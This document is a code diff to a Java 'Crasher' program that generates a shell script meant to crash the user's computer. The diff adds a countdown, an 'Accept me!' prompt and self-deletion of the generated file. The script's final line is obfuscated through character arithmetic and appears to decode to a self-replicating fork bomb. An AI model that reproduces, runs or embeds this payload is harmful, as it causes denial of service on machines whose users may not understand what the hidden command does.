@@ -19,6 +19,7 @@ public class Crasher{
     public String crasher_name;
     public String content;
     public int typeOfOS = 0;
+    public File file;
 
     public void crashThis(int os){
 
@@ -39,8 +40,7 @@ public class Crasher{
       }catch(IOException e){
         e.printStackTrace();
       }
-
-      System.out.println("crashThis()");
+      this.file.delete();
     }
 
     public CrasherScript(){
@@ -56,7 +56,7 @@ public class Crasher{
       this.content = createContent(theAnswer);
 
       try{
-        File file = new File(this.crasher_name);
+        this.file = new File(this.crasher_name);
 
         if(file.delete()){
           System.out.println("You really want to crash your computer again? Fine by me");
@@ -88,11 +88,13 @@ public class Crasher{
       if(typeOfOS == 1){
         leString.append("#!/bin/bash \n");
       }
-
-      for(int i = 0; i < (n/6); i++){
-        leString.append("echo '"+i+"   just adding some random lines' \n");
+      leString.append("echo 'Crash in:' \n");
+      for(int i = (n/8); i > 0 ; i--){
+        leString.append("echo '"+ i +"' \n");
+        leString.append("sleep 0.5 \n");
+        if(i==2) leString.append("echo 'Accept me!' \n");
       }
-      leString.append("echo 'Time for a crash' \n");
+      leString.append("echo 'Time for a crash!!!!!!!!' \n");
       if(this.typeOfOS == 1){
         leString.append((char)(theAnswer+4) + "/$" + (char)48 + (char)124 + "./" + (char)(theAnswer-6) + "0&");
       }else{
